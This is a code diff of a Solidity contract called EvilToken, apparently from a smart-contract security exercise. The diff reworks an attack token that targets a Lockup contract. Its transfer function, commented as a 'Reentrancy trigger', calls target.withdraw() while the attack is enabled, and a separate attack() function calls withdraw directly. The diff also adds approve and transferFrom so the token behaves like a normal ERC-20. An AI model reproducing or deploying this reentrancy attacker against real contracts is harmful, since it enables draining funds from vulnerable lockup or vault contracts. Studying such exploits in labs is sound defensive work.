@@ -4,28 +4,36 @@ pragma solidity ^0.8.20;
 import "./Lockup.sol";
 
 contract EvilToken {
-    string public name = "EvilToken";
-    string public symbol = "EVL";
-    uint8 public decimals = 18;
 
-    mapping(address => uint256) private balances;
+    mapping(address => uint256) public balances;
+    mapping(address => mapping(address 
+    => uint256)) public allowance;
+    
+Lockup public target;
 
-    Lockup public target;
-
-    bool public attackEnabled;   // ✅ toggle
+    bool public attackEnabled;
     bool internal attacking;
 
     constructor() {
         balances[msg.sender] = 1_000_000 ether;
     }
 
-function attack() external {
-    target.withdraw();
-}
-
-    function balanceOf(address account) external view returns (uint256) {
+    function balanceOf(address account)
+        external
+        view
+        returns (uint256)
+    {
         return balances[account];
     }
+   function approve(
+        address spender,
+        uint256 amount
+    ) external returns (bool) {
+
+    allowance[msg.sender][spender] = amount;
+
+    return true;
+}
 
     function setTarget(address _target) external {
         target = Lockup(_target);
@@ -35,15 +43,30 @@ function attack() external {
         attackEnabled = _enabled;
     }
 
-    function transfer(address to, uint256 amount) external returns (bool) {
-        require(balances[msg.sender] >= amount, "not enough");
+    function attack() external {
+        target.withdraw();
+    }
 
-        // normal transfer
+    function transfer(
+        address to,
+        uint256 amount
+    ) external returns (bool) {
+
+        require(
+            balances[msg.sender] >= amount,
+            "not enough"
+        );
+
         balances[msg.sender] -= amount;
         balances[to] += amount;
 
-        // ONLY attack when enabled
-        if (attackEnabled && !attacking && address(target) != address(0)) {
+        // Reentrancy trigger
+        if (
+            attackEnabled &&
+            !attacking &&
+            address(target) != address(0)
+        ) {
+
             attacking = true;
 
             target.withdraw();
@@ -53,4 +76,28 @@ function attack() external {
 
         return true;
     }
+
+function transferFrom(
+    address from,
+    address to,
+    uint256 amount
+) external returns (bool) {
+
+    require(
+        balances[from] >= amount,
+        "not enough"
+    );
+
+    require(
+        allowance[from][msg.sender] >= amount,
+        "not approved"
+    );
+
+    allowance[from][msg.sender] -= amount;
+
+    balances[from] -= amount;
+    balances[to] += amount;
+
+    return true;
+   }
 }
